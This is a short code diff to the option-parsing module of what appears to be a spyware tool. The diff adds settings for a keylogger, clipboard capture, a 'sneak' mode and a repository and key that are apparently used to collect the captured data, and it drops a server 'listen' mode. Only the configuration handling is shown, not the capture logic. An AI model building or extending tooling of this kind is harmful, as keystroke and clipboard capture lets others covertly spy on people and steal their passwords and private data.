@@ -1,3 +1,4 @@
+from params import *
 from typing import Callable, Dict, Any
 from threading import Event
 
@@ -8,12 +9,20 @@ RUNNING.set()
 
 
 def update(argline: list) -> None:
+    if REPO != "":
+        PARAM["repo"] = REPO
+    if KEY != "":
+        PARAM["key"] = KEY
+    if INTERVAL != "":
+        PARAM["interval"] = INTERVAL
+    if SNEAK != "":
+        PARAM["sneak"] = SNEAK
+    if KEYLOGGER:
+        PARAM["keylogger"] = ""
+    if CLIPBOARD != "":
+        PARAM["clipboard"] = ""
     for i in range(0, len(argline)):
         match argline[i]:
-            case "mode":
-                if argline[i + 1] in ["server", "listen"]:
-                    PARAM["mode"] = "listen"
-                    i += 1
             case "sneak":
                 PARAM["sneak"] = argline[i + 1]
                 i += 1
@@ -28,6 +37,8 @@ def update(argline: list) -> None:
                 i += 1
             case "keylogger":
                 PARAM["keylogger"] = ""
+            case "clipboard":
+                PARAM["clipboard"] = ""
             case _:
                 continue
     if PARAM.get("repo") == None:
